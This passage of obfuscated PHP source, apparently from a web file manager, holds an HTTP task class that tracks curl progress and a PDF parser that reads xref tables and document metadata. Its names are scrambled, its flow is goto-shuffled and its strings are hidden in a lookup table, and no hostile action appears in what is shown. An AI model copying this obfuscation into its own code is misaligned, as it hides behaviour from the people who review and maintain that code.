($EääŒ¨ëÂ°[$eÅ„ØŞ˜­×[1470]] == $fïğˆåã¬) { $EääŒ¨ëÂ°[$eÅ„ØŞ˜­×[1471]] = $cÏÆ§²ŠåÜ; $EääŒ¨ëÂ°[$eÅ„ØŞ˜­×[965]] = $eÅ„ØŞ˜­×[1487]; $EääŒ¨ëÂ°[$eÅ„ØŞ˜­×[1472]] = $eÅ„ØŞ˜­×[1031]; } } } $this->update(); } public function curlProgressStart($Eôé²ó¢§) { } public function curlProgressEnd($cºÄ»Ûó¾) { $C“ÓêÚº¥ =& $_SERVER[¨¤¼…´]; $fÊ¥Ş«ß¾ =& $this->task; $bË¡½õãºå = curl_getinfo($cºÄ»Ûó¾); $f½Æ‰¢Âƒˆ = $bË¡½õãºå[$C“ÓêÚº¥[1488]]; if ($fÊ¥Ş«ß¾[$C“ÓêÚº¥[1472]] == $C“ÓêÚº¥[113] && $f½Æ‰¢Âƒˆ) { $fÊ¥Ş«ß¾[$C“ÓêÚº¥[1473]] += $f½Æ‰¢Âƒˆ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $Fµ ÜàÈëÍ =& $_SERVER[¨¤¼…´]; $b„øôôì† =& $this->task; $b„øôôì†[$Fµ ÜàÈëÍ[1489]] = 1; Hook::bind($Fµ ÜàÈëÍ[1462], array($this, $Fµ ÜàÈëÍ[1490])); Hook::bind($Fµ ÜàÈëÍ[1464], array($this, $Fµ ÜàÈëÍ[1491])); Hook::bind($Fµ ÜàÈëÍ[1466], array($this, $Fµ ÜàÈëÍ[1492])); } protected function endAfter() { $c ™ÅÎ½Í =& $_SERVER[¨¤¼…´]; Hook::unbind($c ™ÅÎ½Í[1462], array($this, $c ™ÅÎ½Í[1490])); Hook::unbind($c ™ÅÎ½Í[1464], array($this, $c ™ÅÎ½Í[1491])); Hook::unbind($c ™ÅÎ½Í[1466], array($this, $c ™ÅÎ½Í[1492])); } public function progressStart($A—ŸÑŒÕÁ‹) { $f¡İ„å‚Û¼ =& $_SERVER[¨¤¼…´]; $eÇ¶µ—Ğ = curl_getinfo($A—ŸÑŒÕÁ‹); self::log($f¡İ„å‚Û¼[1493] . $eÇ¶µ—Ğ[$f¡İ„å‚Û¼[308]]); self::valueSet($this->task[$f¡İ„å‚Û¼[379]], $this->task); } public function progressEnd($cè›ÎÙá¿×) { $b‘˜­ºƒ„ =& $_SERVER[¨¤¼…´]; self::log($b‘˜­ºƒ„[1494] . $this->task[$b‘˜­ºƒ„[379]]); $this->end(); } public function progress($F¢¹Øƒ Ûâ, $dé›á„øÔ, $bêåÊ™¹²ƒ, $Aİù‘ò„‰¬, $CˆÄ°ÔÄö…) { $AˆĞÀ¥Áİ =& $_SERVER[¨¤¼…´]; $fšËÂìÄö =& $this->task; if ($CˆÄ°ÔÄö… > 0) { $fšËÂìÄö[$AˆĞÀ¥Áİ[963]] = $fšËÂìÄö[$AˆĞÀ¥Áİ[963]] == 0 ? $Aİù‘ò„‰¬ : $fšËÂìÄö[$AˆĞÀ¥Áİ[963]]; $fšËÂìÄö[$AˆĞÀ¥Áİ[977]] = $CˆÄ°ÔÄö…; } else { if ($bêåÊ™¹²ƒ > 0) { $fšËÂìÄö[$AˆĞÀ¥Áİ[963]] = $fšËÂìÄö[$AˆĞÀ¥Áİ[963]] == 0 ? $dé›á„øÔ : $fšËÂìÄö[$AˆĞÀ¥Áİ[963]]; $fšËÂìÄö[$AˆĞÀ¥Áİ[977]] = $bêåÊ™¹²ƒ; } } $this->update(); self::log("\x70\162\157\147\162\145\x73\x73\x48\x74\164\160\x3a\144\x6f\167\x6e\72{$bêåÊ™¹²ƒ}\57{$dé›á„øÔ}\73\40\165\x70\x6c\157\x61\x64\72{$CˆÄ°ÔÄö…}\57{$Aİù‘ò„‰¬}\x3b"); } } goto e¸óÈª„®¸; f¶º“Œˆ³Ã: class FileParsePdf { public static function parse($bğ­îêƒ¾) { goto fÎ„¡Ô°¹; A´¯íëÑ†à: preg_match($D®ñÓ¯×ìá, $Fˆã‹«ñ¥¾[$FÏç°‰«Ì[1522]], $B…î×Õ’‘); if (!$B’¢¥²¼[$FÏç°‰«Ì[172]] && count($B…î×Õ’‘) == 5) { $B’¢¥²¼[$FÏç°‰«Ì[172]] = $B…î×Õ’‘[3]; $B’¢¥²¼[$FÏç°‰«Ì[173]] = $B…î×Õ’‘[4]; } preg_match($FÏç°‰«Ì[1525], $Fˆã‹«ñ¥¾[$FÏç°‰«Ì[1521]], $B…î×Õ’‘); goto A‡°…¨×Ğ; A‡°…¨×Ğ: if ($B…î×Õ’‘) { $B’¢¥²¼[$FÏç°‰«Ì[1330]] = $B…î×Õ’‘[1]; } $B’¢¥²¼[$FÏç°‰«Ì[1526]] = 0; $D®ñÓ¯×ìá = $FÏç°‰«Ì[1527]; goto a“Ì…åóÖ; a“Ì…åóÖ: preg_match_all($D®ñÓ¯×ìá, $Fˆã‹«ñ¥¾[$FÏç°‰«Ì[1521]], $B…î×Õ’‘); if ($B…î×Õ’‘[1] && $B’¢¥²¼[$FÏç°‰«Ì[1526]] < $B…î×Õ’‘[1][0]) { $B’¢¥²¼[$FÏç°‰«Ì[1526]] = $B…î×Õ’‘[1][0]; } preg_match_all($D®ñÓ¯×ìá, $Fˆã‹«ñ¥¾[$FÏç°‰«Ì[1522]], $B…î×Õ’‘); goto cŒƒè¸Ç‚–; BƒÙÈ¸«–: $D®ñÓ¯×ìá = $FÏç°‰«Ì[1524]; preg_match($D®ñÓ¯×ìá, $Fˆã‹«ñ¥¾[$FÏç°‰«Ì[1521]], $B…î×Õ’‘); if (!$B’¢¥²¼[$FÏç°‰«Ì[172]] && count($B…î×Õ’‘) == 5) { $B’¢¥²¼[$FÏç°‰«Ì[172]] = $B…î×Õ’‘[3]; $B’¢¥²¼[$FÏç°‰«Ì[173]] = $B…î×Õ’‘[4]; } goto A´¯íëÑ†à; fÎ„¡Ô°¹: $FÏç°‰«Ì =& $_SERVER[¨¤¼…´]; $aÜ–ŒÓœŸ» = 32 * 1024; $Fˆã‹«ñ¥¾ = array($FÏç°‰«Ì[769] => fopen($bğ­îêƒ¾, $FÏç°‰«Ì[1159]), $FÏç°‰«Ì[85] => $bğ­îêƒ¾, $FÏç°‰«Ì[87] => filesize_64($bğ­îêƒ¾), $FÏç°‰«Ì[1520] => $aÜ–ŒÓœŸ»); goto Dç…Î¡ñô; Dç…Î¡ñô: $Fˆã‹«ñ¥¾[$FÏç°‰«Ì[1521]] = StreamWrapperIO::read($bğ­îêƒ¾, 0, $aÜ–ŒÓœŸ»); $Fˆã‹«ñ¥¾[$FÏç°‰«Ì[1522]] = StreamWrapperIO::read($bğ­îêƒ¾, $Fˆã‹«ñ¥¾[$FÏç°‰«Ì[87]] - $aÜ–ŒÓœŸ», $aÜ–ŒÓœŸ»); $Dİ¾ĞÆÌÔ÷ = self::decodeXref($Fˆã‹«ñ¥¾); goto FŞæË¶¯Ï…; cŒƒè¸Ç‚–: if ($B…î×Õ’‘[1] && $B’¢¥²¼[$FÏç°‰«Ì[1526]] < $B…î×Õ’‘[1][0]) { $B’¢¥²¼[$FÏç°‰«Ì[1526]] = $B…î×Õ’‘[1][0]; } $B’¢¥²¼ = self::parseInfoItem($B’¢¥²¼); return $B’¢¥²¼; goto D©ñ©ŞÎğ‘; FŞæË¶¯Ï…: if ($Dİ¾ĞÆÌÔ÷) { $A™ ‡òÇÑì = $Dİ¾ĞÆÌÔ÷[$FÏç°‰«Ì[1523]][$FÏç°‰«Ì[1182]]; $B’¢¥²¼ = self::getObjectValue($Fˆã‹«ñ¥¾, $Dİ¾ĞÆÌÔ÷, $A™ ‡òÇÑì); } $B’¢¥²¼ = is_array($B’¢¥²¼) ? $B’¢¥²¼ : array(); $B’¢¥²¼[$FÏç°‰«Ì[172]] = 0; goto BƒÙÈ¸«–; D©ñ©ŞÎğ‘: } private static function parseInfoItem($f¦èÂ÷Òùõ) { $A“·­Õ¿°Õ =& $_SERVER[¨¤¼…´]; if (!$f¦èÂ÷Òùõ) { return !1; } $b¥—ÇØ¥Å§ = array($A“·­Õ¿°Õ[1331] => array($A“·­Õ¿°Õ[1528], $A“·­Õ¿°Õ[43]), $A“·­Õ¿°Õ[1529] => array($A“·­Õ¿°Õ[1530], $A“·­Õ¿°Õ[43]), $A“·­Õ¿°Õ[201] => array($A“·­Õ¿°Õ[1531], $A“·­Õ¿°Õ[224]), $A“·­Õ¿°Õ[117] => array($A“·­Õ¿°Õ[1532], $A“·­Õ¿°Õ[224]), $A“·­Õ¿°Õ[1526] => array($A“·­Õ¿°Õ[1526], $A“·­Õ¿°Õ[289]), $A“·­Õ¿°Õ[172] => array($A“·­Õ¿°Õ[172], $A“·­Õ¿°Õ[289]), $A“·­Õ¿°Õ[173] => array($A“·­Õ¿°Õ[173], $A“·­Õ¿°Õ[289]), $A“·­Õ¿°Õ[1533] => array($A“·­Õ¿°Õ[1534], $A“·­Õ¿°Õ[43]), $A“·­Õ¿°Õ[1535] => array($A“·­Õ¿°Õ[1536], $A“·­Õ¿°Õ[43]), $A“·­Õ¿°Õ[1537] => array($A“·­Õ¿°Õ[1330], $A“·­Õ¿°Õ[43])); $eóÙÙâ‡Áê = array(); foreach ($b¥—ÇØ¥Å§ as $cÚ¼‘ùåÉö => $eË¸ÖòÌœ) { if (!isset($f¦èÂ÷Òùõ[$eË¸ÖòÌœ[0]])) { continue; } $dåª£¨¹æ = $f¦èÂ÷Òùõ[$eË¸ÖòÌœ[0]]; if (!$dåª£¨¹æ || is_array($dåª£¨¹æ)) { continue; } switch ($eË¸ÖòÌœ[1]) { case $A“·­Õ¿°Õ[289]: $dåª£¨¹æ = intval($dåª£¨¹æ); break; case $A“·­Õ¿°Õ[224]: if (substr($dåª£¨¹æ, 0, 2) == $A“·­Õ¿°Õ[1538]) { $dåª£¨¹æ = substr($dåª£¨¹æ, 2, 14); } if (strtotime($dåª£¨¹æ)) { $dåª£¨¹æ = date($A“·­Õ¿°Õ[1539], strtotime($dåª£¨¹æ)); } break; } $eóÙÙâ‡Áê[$cÚ¼‘ùåÉö] = $dåª£¨¹æ; } return $eóÙÙâ‡Áê; } private static function decodeXref(&$AĞñŠ‰Ÿ¡) { goto c±Á¾Ø‚Æ; eÉÜ‘ï¹»Ú: if (preg_match($bï‡©îÁÎÚ[1547], $D´…‡Æ™Ô‹, $fõ•÷ÕŠïä) > 0) { $F¸Ş©²Œ•’[$bï‡©îÁÎÚ[1523]][$bï‡©îÁÎÚ[87]] = intval($fõ•÷ÕŠïä[1]); } if (preg_match($bï‡©îÁÎÚ[1548], $D´…‡Æ™Ô‹, $fõ•÷ÕŠïä) > 0) { $F¸Ş©²Œ•’[$bï‡©îÁÎÚ[1523]][$bï‡©îÁÎÚ[1549]] = intval($fõ•÷ÕŠïä[1]) . $bï‡©îÁÎÚ[80] . intval($fõ•÷ÕŠïä[2]); } if (preg_match($bï‡©îÁÎÚ[1550], $D´…‡Æ™Ô‹, $fõ•÷ÕŠïä) > 0) { $F¸Ş©²Œ•’[$bï‡©îÁÎÚ[1523]][$bï‡©îÁÎÚ[1551]] = intval($fõ•÷ÕŠïä[1]) . $bï‡©îÁÎÚ[80] . intval($fõ•÷ÕŠïä[2]); } goto Cİñ²±Úò‡; BÛ¼ÚæÁÓ: if (preg_match($bï‡©îÁÎÚ[1554], $D´…‡Æ™Ô‹, $fõ•÷ÕŠïä) > 0) { } return $F¸Ş©²Œ•’; goto aÓÎš§òå“; F„ï²Ï™Ç‚: foreach ($fõ•÷ÕŠïä[3] as $a¦¶ò¡ï½¿ => $f¾´©ó) { if ($fõ•÷ÕŠïä[3][$a¦¶ò¡ï½¿] == $bï‡©îÁÎÚ[1543]) { $EÒÌÙŠÀ´Ñ = $A¸”Õ±¸°ì . $bï‡©îÁÎÚ[80] . intval($fõ•÷ÕŠïä[2][$a¦¶ò¡ï½¿]); $F¸Ş©²Œ•’[$bï‡©îÁÎÚ[1540]][$EÒÌÙŠÀ´Ñ] = intval($fõ•÷ÕŠïä[1][$a¦¶ò¡ï½¿]); ++$A¸”Õ±¸°ì; } else { if ($fõ•÷ÕŠïä[3][$a¦¶ò¡ï½¿] == $bï‡©îÁÎÚ[1544]) { ++$A¸”Õ±¸°ì; } else { } } } if (preg_match_all($bï‡©îÁÎÚ[1545], $eÀ»ğâ¤, $fõ•÷ÕŠïä)) { $f‹…¡á…ÇÊ = $AĞñŠ‰Ÿ¡[$bï‡©îÁÎÚ[87]] - $AĞñŠ‰Ÿ¡[$bï‡©îÁÎÚ[1520]]; foreach ($fõ•÷ÕŠïä[0] as $a¦¶ò¡ï½¿ => $e¼±¹˜’Œ) { $c¨¯¼Î˜â = $fõ•÷ÕŠïä[1][$a¦¶ò¡ï½¿] . $bï‡©îÁÎÚ[80] . $fõ•÷ÕŠïä[2][$a¦¶ò¡ï½¿]; $F¸Ş©²Œ•’[$bï‡©îÁÎÚ[1540]][$c¨¯¼Î˜â] = strpos($eÀ»ğâ¤, $e¼±¹˜’Œ) + $f‹…¡á…ÇÊ + 1; } } if (preg_match_all($bï‡©îÁÎÚ[1546], $eÀ»ğâ¤, $fõ•÷ÕŠïä)) { $D´…‡Æ™Ô‹ = count($fõ•÷ÕŠïä[1]) == 1 ? $fõ•÷ÕŠïä[1][0] : $fõ•÷ÕŠïä[1][1]; } else { $D´…‡Æ™Ô‹ = substr($eÀ»ğâ¤, -1024 * 5); } goto eÉÜ‘ï¹»Ú; Cİñ²±Úò‡: if (preg_match($bï‡©îÁÎÚ[1552], $D´…‡Æ™Ô‹, $fõ•÷ÕŠïä) > 0) { $F¸Ş©²Œ•’[$bï‡©îÁÎÚ[1523]][$bï‡©îÁÎÚ[1182]] = intval($fõ•÷ÕŠïä[1]) . $bï‡©îÁÎÚ[80] . intval($fõ•÷ÕŠïä[2]); } if (preg_match($bï‡©îÁÎÚ[1553], $D´…‡Æ™Ô‹, $fõ•÷ÕŠïä) > 0) { $F¸Ş©²Œ•’[$bï‡©îÁÎÚ[1523]][$bï‡©îÁÎÚ[379]] = array(); $F¸Ş©²Œ•’[$bï‡©îÁÎÚ[1523]][$bï‡©îÁÎÚ[379]][0] = $fõ•÷ÕŠïä[1]; $F¸Ş©²Œ•’[$bï‡©îÁÎÚ[1523]][$bï‡©îÁÎÚ[379]][1] = $fõ•÷ÕŠïä[2]; } if (!$F¸Ş©²Œ•’[$bï‡©îÁÎÚ[1523]][$bï‡©îÁÎÚ[1182]]) { return !1; } goto BÛ¼ÚæÁÓ; DÂÔ·•ò: if ($AĞñŠ‰Ÿ¡[$bï‡©îÁÎÚ[87]] - $cƒÁã»À > $AĞñŠ‰Ÿ¡[$bï‡©îÁÎÚ[1520]]) { $bğ·£òª‰¸ = 4 * $AĞñŠ‰Ÿ¡[$bï‡©îÁÎÚ[1520]]; $AĞñŠ‰Ÿ¡[$bï‡©îÁÎÚ[1520]] = $bğ·£òª‰¸; $AĞñŠ‰Ÿ¡[$bï‡©îÁÎÚ[1521]] = StreamWrapperIO::read($AĞñŠ‰Ÿ¡[$bï‡©îÁÎÚ[85]], 0, $bğ·£òª‰¸); $AĞñŠ‰Ÿ¡[$bï‡©îÁÎÚ[1522]] = StreamWrapperIO::read($AĞñŠ‰Ÿ¡[$bï‡©îÁÎÚ[85]], $AĞñŠ‰Ÿ¡[$bï‡©îÁÎÚ[87]] - $bğ·£òª‰¸, $bğ·£òª‰¸); $eÀ»ğâ¤ = $AĞñŠ‰Ÿ¡[$bï‡©îÁÎÚ[1522]]; } $A¸”Õ±¸°ì = 0; preg_match_all($bï‡©îÁÎÚ[1542], $eÀ»ğâ¤, $fõ•÷ÕŠïä); goto F„ï²Ï™Ç‚; c±Á¾Ø‚Æ: $bï‡©îÁÎÚ =& $_SERVER[¨¤¼…´]; $eÀ»ğâ¤ = $AĞñŠ‰Ÿ¡[$bï‡©îÁÎÚ[1522]]; $F¸Ş©²Œ•’ = array($bï‡©îÁÎÚ[1523] => array(), $bï‡©îÁÎÚ[1540] => array()); goto c»Á¹·Íõ; c»Á¹·Íõ: $bê–¬¼¶Û = $bï‡©îÁÎÚ[1541]; if (!preg_match_all($bê–¬¼¶Û, $eÀ»ğâ¤, $fõ•÷ÕŠïä, PREG_SET_ORDER, 0)) { return !1; } $cƒÁã»À = intval($fõ•÷ÕŠïä[0][1]); goto DÂÔ·•ò; aÓÎš§òå“: } private static function getObjectValue($F¢ÁùñöŒÇ, $BÒ‘ÀˆÓ§©, $fÕ­°²Î˜) { goto e•æã¥æçá; aäÕ·óœÅ: return $bÙŠÆ§†Íğ; goto DÍÖ×èƒ; e•æã¥æçá: $e·¿­÷ÄÔ› =& $_SERVER[¨¤¼…´]; $A“Ú¸œù¤Ë = self::getObject($F¢ÁùñöŒÇ, $BÒ‘ÀˆÓ§©[$e·¿­÷ÄÔ›[1540]][$fÕ­°²Î˜]); if (is_string($A“Ú¸œù¤Ë[1])) { return $A“Ú¸œù¤Ë[1]; } goto dæÒ÷êº‡©; dæÒ÷êº‡©: if (!is_array($A“Ú¸œù¤Ë[1])) { return array(); } $bÙŠÆ§†Íğ = array(); for ($F¶íÄ—™Á¯ = 0; $F¶íÄ—™Á¯ < count($A“Ú¸œù¤Ë[1]); $F¶íÄ—™Á¯ += 2) { $c÷ØŸòÇÜ = $A“Ú¸œù¤Ë[1][$F¶íÄ—™Á¯]; $f­Ë“ñÄ¸‘ = $A“Ú¸œù¤Ë[1][$F¶íÄ—™Á¯ + 1]; if (count($c÷ØŸòÇÜ) == 3 && $c÷ØŸòÇÜ[0] == $e·¿­÷ÄÔ›[8]) { $eøÉ¢ÚÃÎ´ = !1; if ($f­Ë“ñÄ¸‘[0] == $e·¿­÷ÄÔ›[1555]) { $f­Ë“ñÄ¸‘ = self::getObject($F¢ÁùñöŒÇ, $BÒ‘ÀˆÓ§©[$e·¿­÷ÄÔ›[1540]][$f­Ë“ñÄ¸‘[1]]); } $eøÉ¢ÚÃÎ´ = $f­Ë“ñÄ¸‘[1]; if ($eøÉ¢ÚÃÎ´ === !1) { continue; } if (is_string($eøÉ¢ÚÃÎ´)) { $eøÉ¢ÚÃÎ´ = self::decodeStr($eøÉ¢ÚÃÎ´); } $bÙŠÆ§†Íğ[$c÷ØŸòÇÜ[1]] = $eøÉ¢ÚÃÎ´; } } goto aäÕ·óœÅ; DÍÖ×èƒ: } private static function getObject($Bµ®‡²ù, $F·ÙŞ‰»Û£) { $a²Î‚º’”‡ = self::getObjectItem($Bµ®‡²ù, $F·ÙŞ‰»Û£); $a²Î‚º’”‡ = self::getObjectItem($Bµ®‡²ù, $a²Î‚º’”‡[2]); return $a²Î‚º’”‡; } private static function getObjectItem($fãÕêËß†í, $FÌŒóêàƒ…) { goto CçÆ¶åìˆİ; CŸÏåœƒ¿”: $F¢°îš†äë = self::getRawObject($fª³•Ì°¥„, $eÁÚ¥¡Ç); if ($FÌŒóêàƒ… >= $b…ë«ÛÂ) { $F¢°îš†äë[2] = $F¢°îš†äë[2] + $b…ë«ÛÂ; } else { if ($FÌŒóêàƒ… > $f»œÃŒ”„Í && $FÌŒóêàƒ… <= $b…ë«ÛÂ) { $F¢°îš†äë[2] = $F¢°îš†äë[2] + $FÌŒóêàƒ…; } } return $F¢°îš†äë; goto dæÛï·Ïòë; Fğ£‘‹‹èÇ: $eÁÚ¥¡Ç = $FÌŒóêàƒ… >= $b…ë«ÛÂ ? $FÌŒóêàƒ… - $b…ë«ÛÂ : $FÌŒóêàƒ…; $fª³•Ì°¥„ = $FÌŒóêàƒ… >= $b…ë«ÛÂ ? $fãÕêËß†í[$F¤˜‚’®…ƒ[1522]] : $fãÕêËß†í[$F¤˜‚’®…ƒ[1521]]; if ($FÌŒóêàƒ… > $f»œÃŒ”„Í && $FÌŒóêàƒ… <= $b…ë«ÛÂ) { $eÁÚ¥¡Ç = 0; $fª³•Ì°¥„ = StreamWrapperIO::read($fãÕêËß†í[$F¤˜‚’®…ƒ[85]], $FÌŒóêàƒ…, $f»œÃŒ”„Í); } goto CŸÏåœƒ¿”; CçÆ¶åìˆİ: $F¤˜‚’®…ƒ =& $_SERVER[¨¤¼…´]; $f»œÃŒ”„Í = $fãÕêËß†í[$F¤˜‚’®…ƒ[1520]]; $b…ë«ÛÂ = $fãÕêËß†í[$F¤˜‚’®…ƒ[87]] - $f»œÃŒ”„Í; goto Fğ£‘‹‹èÇ; dæÛï·Ïòë: } private static function decodeStr($bùÛÁÔ§˜±) { goto Eø¸ÜÊ¯‹‰; D³â”ä¡–: $bùÛÁÔ§˜± = $e·ŞäÀŸë¨[43]; foreach ($F‚å³½“”­ as $DÊ„Ë•áŠ) { if (preg_match($e·ŞäÀŸë¨[1565], $DÊ„Ë•áŠ)) { $bùÛÁÔ§˜± .= \chr(octdec(trim($DÊ„Ë•áŠ, $e·ŞäÀŸë¨[103]))); } else { $bùÛÁÔ§˜± .= $DÊ„Ë•áŠ; } } $F‚å³½“”­ = preg_split($e·ŞäÀŸë¨[1566], $bùÛÁÔ§˜±, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto C–³¥À¸Õ¼; Eø¸ÜÊ¯‹‰: $e·ŞäÀŸë¨ =& $_SERVER[¨¤¼…´]; $bùÛÁÔ§˜± = str_replace(array($e·ŞäÀŸë¨[1556], $e·ŞäÀŸë¨[1557], $e·ŞäÀŸë¨[1558], $e·ŞäÀŸë¨[1559], $e·ŞäÀŸë¨[1560], $e·ŞäÀŸë¨[1561], $e·ŞäÀŸë¨[1562], $e·ŞäÀŸë¨[1563]), array($e·ŞäÀŸë¨[103], $e·ŞäÀŸë¨[60], $e·ŞäÀŸë¨[8], $e·ŞäÀŸë¨[261], $e·ŞäÀŸë¨[806], $e·ŞäÀŸë¨[14], $e·ŞäÀŸë¨[979], $e·ŞäÀŸë¨[343]), $bùÛÁÔ§˜±); $F‚å³½“”­ = preg_split($e·ŞäÀŸë¨[1564], $bùÛÁÔ§˜±, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto D³â”ä¡–; C¶Ó­ù‚: $bùÛÁÔ§˜± = $e·ŞäÀŸë¨[43]; foreach ($F‚å³½“”­ as $DÊ„Ë•áŠ) { if (preg_match($e·ŞäÀŸë¨[1570], $DÊ„Ë•áŠ) && !1 === stripos($DÊ„Ë•áŠ, $e·ŞäÀŸë¨[1571])) { $DÊ„Ë•áŠ = preg_replace($e·ŞäÀŸë¨[1572], $e·ŞäÀŸë¨[43], $DÊ„Ë•áŠ); $DÊ„Ë•áŠ = trim($DÊ„Ë•áŠ, $e·ŞäÀŸë¨[912]); $DÊ„Ë•áŠ = pack($e·ŞäÀŸë¨[1573], $DÊ„Ë•áŠ); $bùÛÁÔ§˜± .= $DÊ„Ë•áŠ; } else { $bùÛÁÔ§˜± .= $DÊ„Ë•áŠ; } } if (preg_match($e·ŞäÀŸë¨[1574], $bùÛÁÔ§˜±)) { $eó¿©ÆÇ® = substr($bùÛÁÔ§˜±, 2); $bùÛÁÔ§˜± = $e·ŞäÀŸë¨[43]; $eªÕÙ¥Ü‡÷ = strlen($eó¿©ÆÇ®); for ($F³¡–‡Ö = 0; $F³¡–‡Ö < $eªÕÙ¥Ü‡÷; $F³¡–‡Ö += 2) { $A¸‡¡ß…Ÿ = hexdec(bin2hex(substr($eó¿©ÆÇ®, $F³¡–‡Ö, 2))); $bùÛÁÔ§˜± .= mb_convert_encoding($e·ŞäÀŸë¨[1575] . intval($A¸‡¡ß…Ÿ) . $e·ŞäÀŸë¨[77], $e·ŞäÀŸë¨[1576], $e·ŞäÀŸë¨[1577]); } } goto C¥‡îÍø; C–³¥À¸Õ¼: $bùÛÁÔ§˜± = $e·ŞäÀŸë¨[43]; foreach ($F‚å³½“”­ as $DÊ„Ë•áŠ) { if (preg_match($e·ŞäÀŸë¨[1567], $DÊ„Ë•áŠ)) { $bùÛÁÔ§˜± .= \chr(hexdec(trim($DÊ„Ë•áŠ, $e·ŞäÀŸë¨[1568]))); } else { $bùÛÁÔ§˜± .= $DÊ„Ë•áŠ; } } $F‚å³½“”­ = preg_split($e·ŞäÀŸë¨[1569], $bùÛÁÔ§˜±, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto C¶Ó­ù‚; C¥‡îÍø: return $bùÛÁÔ§˜±; goto CèÖòí¾; CèÖòí¾: } private static function getRawObject($BÓ—Ëéè³¾, $F­³„Ü·˜ = 0) { goto A¤¹¡…Ÿí„; e´¥«„™Õ: return array($AÛçÏÌ¿æÚ, $e·Şª—Öî, $F­³„Ü·˜); goto Dï’Àß‹‚; d‡­ÊœÍÅº: $F­³„Ü·˜ += strspn($BÓ—Ëéè³¾, $bäÁÉ­«Œ÷[1578], $F­³„Ü·˜); $f¶Îš½áš = $BÓ—Ëéè³¾[$F­³„Ü·˜]; switch ($f¶Îš½áš) { case $bäÁÉ­«Œ÷[1579]: $FÜ£›Ğ¤¬ = strcspn($BÓ—Ëéè³¾, $bäÁÉ­«Œ÷[1580], $F­³„Ü·˜); if ($FÜ£›Ğ¤¬ > 0) { $F­³„Ü·˜ += $FÜ£›Ğ¤¬; return self::getRawObject($BÓ—Ëéè³¾, $F­³„Ü·˜); } break; case $bäÁÉ­«Œ÷[8]: $AÛçÏÌ¿æÚ = $f¶Îš½áš; ++$F­³„Ü·˜; $cå£¦…ö¾ = preg_match($bäÁÉ­«Œ÷[1581], substr($BÓ—Ëéè³¾, $F­³„Ü·˜, 256), $C›å§µ¥³); if (1 == $cå£¦…ö¾) { $e·Şª—Öî = $C›å§µ¥³[1]; $F­³„Ü·˜ += strlen($e·Şª—Öî); } break; case $bäÁÉ­«Œ÷[261]: case $bäÁÉ­«Œ÷[806]: $AÛçÏÌ¿æÚ = $f¶Îš½áš; ++$F­³„Ü·˜; $eŒåµ»¢‚İ = $F­³„Ü·˜; if ($bäÁÉ­«Œ÷[261] == $f¶Îš½áš) { $c¯ïÊøèœ÷ = 1; while ($c¯ïÊøèœ÷ > 0) { if (!isset($BÓ—Ëéè³¾[$eŒåµ»¢‚İ])) { break; } $Cª‡¼æ‘ã = $BÓ—Ëéè³¾[$eŒåµ»¢‚İ]; switch ($Cª‡¼æ‘ã) { case $bäÁÉ­«Œ÷[103]: ++$eŒåµ»¢‚İ; break; case $bäÁÉ­«Œ÷[261]: ++$c¯ïÊøèœ÷; break; case $bäÁÉ­«Œ÷[806]: --$c¯ïÊøèœ÷; break; } ++$eŒåµ»¢‚İ; } $e·Şª—Öî = substr($BÓ—Ëéè³¾, $F­³„Ü·˜, $eŒåµ»¢‚İ - $F­³„Ü·˜ - 1); $F­³„Ü·˜ = $eŒåµ»¢‚İ; } break; case $bäÁÉ­«Œ÷[167]: case $bäÁÉ­«Œ÷[489]: $AÛçÏÌ¿æÚ = $f¶Îš½áš; ++$F­³„Ü·˜; if ($bäÁÉ­«Œ÷[167] == $f¶Îš½áš) { $e·Şª—Öî = array(); do { $a‡ê¹òÏòî = $F­³„Ü·˜; $B›‚¾‹ˆŒô = self::getRawObject($BÓ—Ëéè³¾, $F­³„Ü·˜); $F­³„Ü·˜ = $B›‚¾‹ˆŒô[2]; $e·Şª—Öî[] = $B›‚¾‹ˆŒô; } while ($bäÁÉ­«Œ÷[489] != $B›‚¾‹ˆŒô[0] && $F­³„Ü·˜ != $a‡ê¹òÏòî); array_pop($e·Şª—Öî); } break; case $bäÁÉ­«Œ÷[911]: case $bäÁÉ­«Œ÷[914]: if (isset($BÓ—Ëéè³¾[$F­³„Ü·˜ + 1]) && $BÓ—Ëéè³¾[$F­³„Ü·˜ + 1] == $f¶Îš½áš) { $AÛçÏÌ¿æÚ = $f¶Îš½áš . $f¶Îš½áš; $F­³„Ü·˜ += 2; if ($bäÁÉ­«Œ÷[911] == $f¶Îš½áš) { $e·Şª—Öî = array(); do { $a‡ê¹òÏòî = $F­³„Ü·˜; $B›‚¾‹ˆŒô = self::getRawObject($BÓ—Ëéè³¾, $F­³„Ü·˜); $F­³„Ü·˜ = $B›‚¾‹ˆŒô[2]; $e·Şª—Öî[] = $B›‚¾‹ˆŒô; } while ($bäÁÉ­«Œ÷[1582] != $B›‚¾‹ˆŒô[0] && $F­³„Ü·˜ != $a‡ê¹òÏòî); array_pop($e·Şª—Öî); } } else { $AÛçÏÌ¿æÚ = $f¶Îš½áš; ++$F­³„Ü·˜; $cå£¦…ö¾ = preg_match($bäÁÉ­«Œ÷[1583], substr($BÓ—Ëéè³¾, $F­³„Ü·˜), $C›å§µ¥³); if ($bäÁÉ­«Œ÷[911] == $f¶Îš½áš && 1 == $cå£¦…ö¾) { $e·Şª—Öî = strtr($C›å§µ¥³[1], $bäÁÉ­«Œ÷[1584], $bäÁÉ­«Œ÷[43]); $F­³„Ü·˜ += \strlen($C›å§µ¥³[0]); } elseif (!1 !== ($cš¬·Â…° = strpos($BÓ—Ëéè³¾, $bäÁÉ­«Œ÷[914], $F­³„Ü·˜))) { $F­³„Ü·˜ = $cš¬·Â…° + 1; } } break; default: if ($bäÁÉ­«Œ÷[1585] == substr($BÓ—Ëéè³¾, $F­³„Ü·˜, 6)) { $AÛçÏÌ¿æÚ = $bäÁÉ­«Œ÷[1585]; $F­³„Ü·˜ += 6; } elseif ($bäÁÉ­«Œ÷[109] == substr($BÓ—Ëéè³¾, $F­³„Ü·˜, 4)) { $AÛçÏÌ¿æÚ = $bäÁÉ­«Œ÷[109]; $F­³„Ü·˜ += 4; $e·Şª—Öî = $bäÁÉ­«Œ÷[109]; } elseif ($bäÁÉ­«Œ÷[1586] == substr($BÓ—Ëéè³¾, $F­³„Ü·˜, 4)) { $AÛçÏÌ¿æÚ = $bäÁÉ­«Œ÷[1587]; $F­³„Ü·˜ += 4; 